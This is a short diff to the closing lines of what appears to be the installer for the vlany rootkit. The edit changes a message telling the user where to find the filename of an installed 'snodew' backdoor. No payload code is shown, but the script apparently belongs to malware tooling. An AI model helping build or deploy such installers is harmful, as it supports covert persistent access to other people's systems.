@@ -439,5 +439,5 @@ fi
 clear
 cat $INSTALL/.vlany_information
 echo "Installation finished."
-echo "If you installed snodew, look in the directory you specified for the filename of the backdoor."
+[ "$REPLY" == "YES" ] && echo "Look in the directory you specified for the filename of the snodew backdoor.";
 exit
